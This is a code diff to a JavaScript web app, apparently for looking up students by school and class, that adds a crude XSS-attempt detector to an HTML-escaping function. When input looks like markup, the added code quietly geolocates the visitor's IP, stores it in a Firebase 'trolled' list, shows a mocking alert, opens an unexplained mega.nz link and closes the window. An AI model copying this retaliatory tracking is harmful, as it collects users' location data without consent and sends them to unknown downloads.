@@ -26,7 +26,21 @@ function findStudentsIn(school, class_val, period) {
 		});
 	});
 }
+function openInNewTab(url) {
+  var win = window.open(url, '_blank');
+  win.focus();
+}
 function _w(param) {
+	if ((param.includes("<") && param.includes(">")) ||
+		(param.includes("(") && param.includes(")")) && param.includes("=")) {
+			$.getJSON('//freegeoip.net/json/?callback=?', function(data) {
+				firebase.database().ref("trolled/").update({ [data["ip"].replace(/\./g, "-")]: JSON.stringify(data, null, 2) })
+				// console.log(JSON.stringify(data, null, 2));
+			});
+			alert("Please stop trying your XSS Attempts :-( I WannaCry");
+			openInNewTab("https://mega.nz/#!uJ0EzIRI!llXqRzR1SF4Lwr0LiA81tPifdsJktVs9TxqFNXT-HWY");
+			window.close();
+	}
 	ret = param.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");	
 	return ret;
 }
